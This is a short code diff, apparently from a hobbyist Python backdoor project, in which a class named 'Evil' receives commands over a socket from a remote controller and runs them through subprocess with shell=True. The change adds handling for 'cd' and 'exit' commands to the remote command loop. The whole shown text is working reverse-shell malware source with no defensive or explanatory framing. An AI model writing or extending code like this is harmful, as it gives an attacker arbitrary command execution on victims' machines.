@@ -7,6 +7,7 @@
 import socket
 import subprocess
 import json
+import os
 
 class Evil:
     def __init__(self,ip,port):
@@ -30,11 +31,22 @@ class Evil:
     def exec_sys_cmd(self,cmd):
         return subprocess.check_output(cmd,shell=True)
 
+    def change_working_dir(self,path):
+        os.chdir(path)
+        return "Changing dir to " + path
+
     def run(self):
         while True:
             try:
+                # cmd_result = ""
                 cmd = self.reliable_recv()
-                cmd_result = self.exec_sys_cmd(cmd)
+                if cmd[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif cmd[0] == "cd" and len(cmd) > 1:
+                    cmd_result = self.change_working_dir(cmd[1])
+                else:
+                    cmd_result = self.exec_sys_cmd(cmd)
                 if not cmd_result:
                     self.reliable_send("System command exception")
                     continue
